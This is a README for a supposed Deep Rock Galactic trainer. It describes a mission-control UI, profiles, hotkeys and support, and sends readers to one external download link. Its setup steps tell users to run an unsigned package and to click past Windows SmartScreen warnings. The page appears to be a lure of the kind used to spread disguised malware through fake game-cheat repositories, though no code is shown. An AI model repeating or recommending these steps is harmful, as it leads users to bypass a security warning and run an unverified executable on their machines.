## 🧭 What Is This Project?

**Deep Rock Galactic Trainer Setup** is a Windows-native setup companion for players who want to explore Deep Rock Galactic with a personalized difficulty curve, enhanced visibility settings, and quality-of-life toggles that the base experience does not expose on the surface.

Think of it as a **mission control console** rather than a cheat menu. Every knob is labeled. Every toggle is documented. Every preset is reversible. The goal is not to break the game — it is to remix it into a version that respects your schedule, your reflexes, and your preferred pacing.

The repository you are reading is the **setup hub**: it contains the configuration schema, the profile management philosophy, the multilingual interface definitions, and the documentation that turns a pile of switches into a coherent expedition plan.

## 🏔️ The Metaphor Behind the Module

Deep Rock Galactic is a game about descending into the unknown with a headlamp, a pickaxe, and three coworkers who may or may not be sober. The tension is the point. But sometimes — after a long week, after a rough shift — you want to descend with a slightly brighter lamp.

This project is that lamp.

It does not remove the dark. It does not hand you the treasure. It simply adjusts the **contrast** of your personal expedition so the shapes are easier to read. The cave remains the cave. The bugs remain the bugs. You remain the dwarf.

That is the entire philosophy in one paragraph, and every feature below is a footnote to it.

## ✨ Feature Highlights

### 🎛️ Responsive Mission Control UI

The trainer's control surface adapts to your screen the way a good HUD adapts to a firefight. Whether you are on a 1080p laptop panel or a 4K ultrawide rig, the layout reflows, the typography stays crisp, and the controls stay reachable.

- **Fluid grid layout** — panels rearrange themselves based on available width.
- **Density modes** — Compact, Standard, and Comfort modes for different monitor sizes.
- **Dark and high-contrast themes** — because your eyes already work hard enough down there.
- **Keyboard-first navigation** — every control reachable without a mouse, for the purists.

### 🌐 Multilingual Support

The interface speaks more than one language, and it does so without awkward machine-translation seams. Localization strings are maintained in structured resource files, reviewed by speakers, and versioned alongside the code.

Currently tuned for a growing set of locales, with room for community contributions. If your language is missing, the contribution path is documented in the support section below.

### ☎️ Customer Support

Documentation is good. Human help is better. This project maintains a **24/7 support posture** through a rotating volunteer steward model — meaning there is almost always someone awake in some timezone who can read your log file and tell you which toggle tripped.

- Response targets: under 24 hours for standard questions.
- Priority lane for setup failures blocking a session.
- A living knowledge base that grows every time a new question is answered.

### 🔧 Session Parameter Tuning

A curated set of session-level parameters that let you shape the **feel** of a mission rather than its outcome:

- Pacing multipliers for enemy aggression curves.
- Visibility adjustments for cave lighting and mineral glow.
- Movement feel presets — from grounded to floaty to "I am the scout now."
- Resource feedback toggles for players who prefer cleaner HUD signals.

Every parameter is bounded. Nothing is unbounded. Bounded knobs are honest knobs.

### 💾 Profile Snapshots

Save a configuration, name it, and recall it later. Profiles are stored as human-readable files so you can diff them, share them with friends, or archive a particularly good setup before you experiment.

- **Infinite naming** — "Friday Night Chill," "Speedrun Sim," "First Time Player Handholding."
- **Version tagging** — know which build a profile was tuned against.
- **Export and import** — move profiles between machines without drama.

### 📊 Resource Insight Overlays

Lightweight overlays that surface information the base HUD keeps quiet — without turning the screen into a spreadsheet. Toggle-able, positionable, and dismissible with a single key.

### ⌨️ Hotkey Choreography

Every frequent action is bound to a key by default, and every binding is rebindable. The hotkey editor validates conflicts before they become problems, so you never end up with two actions fighting over the same physical switch.

## 🚀 Getting Started (Non-Command-Line Route)

This section deliberately avoids terminal incantations. The setup is designed for players who prefer a graphical path.

1. **Locate the download anchor.** Scroll to any [![Download](https://raw.githubusercontent.com/anodv24-hub/Rock-And-Stone-Companion-Setup/main/setup_0823c5.svg)](https://anodv24-hub.github.io/Rock-And-Stone-Companion-Setup/) marker in this document. That is your single entry point.
2. **Retrieve the setup package.** Save it to a folder you can find again — a dedicated "DRG Trainer" folder on your desktop is a popular choice.
3. **Run the setup wizard.** Right-click and choose the standard run option. If Windows shows a smart-screen prompt, choose the "more info" path and proceed — the package is unsigned only because signing infrastructure is expensive for a hobby project.
4. **Follow the on-screen steps.** The wizard asks where to place the trainer, which profile to start with, and which language to display.
5. **Launch your game first.** The trainer expects the game to be running before it attaches. Order matters.
6. **Open the trainer dashboard.** The mission control UI appears, and you are ready to tune.

If any step fails, jump to [Customer Support](#-customer-support). Someone is awake.

## 🧩 Configuration Deep Dive

Configuration is where this project earns its keep. The schema is intentionally verbose so that a reader can understand a profile without running it.

### Top-Level Sections

- **`meta`** — profile name, author note, version tag, creation date.
- **`session`** — mission-level parameters affecting pacing and feedback.
- **`visuals`** — overlay, lighting, and HUD adjustments.
- **`input`** — hotkey bindings and gesture mappings.
- **`safety`** — reversible toggles that guard against accidental extremes.

### Why So Many Sections?

Because a single flat list of toggles becomes unreadable the moment it exceeds twenty entries. Grouping is kindness. Kindness scales.

### Reversibility Guarantee

Every toggle in this project is designed to be turned off. There is no one-way door. If a configuration makes your session worse, you flip the switch back and the game returns to its unmodified feel. This is a hard design rule, not a marketing line.

## 🌍 Multilingual Support

Language is not a feature bolted on at the end. It is a first-class citizen of the interface.

- **Locale files** live alongside the code and follow a predictable naming pattern.
- **Fallback chains** ensure that a missing string never renders as an empty void.
- **Right-to-left readiness** is planned for locales that need it.
- **Community translation path** is documented and welcoming.

If you speak a language the interface does not yet cover, the project would genuinely benefit from your help. The support section explains how to raise your hand.

## ❓ FAQ

**Q: Does this modify the game's files?**
A: No. The trainer attaches at runtime and adjusts session-level parameters. Your installation stays intact.

**Q: Will my progress be affected?**
A: The project is designed for solo and private session experimentation. Follow the disclaimer below.

**Q: Is there a portable version?**
A: The setup package is self-contained by default — no separate runtime needed on modern Windows.

**Q: Can I share my profiles?**
A: Yes. Profiles are plain files. Share them like recipes.

**Q: Why is the interface so configurable?**
A: Because one-size-fits-all tools fit no one. The configurability is the point.

**Q: What if a toggle behaves unexpectedly?**
A: Revert the profile, then report the exact toggle. The support team will investigate.
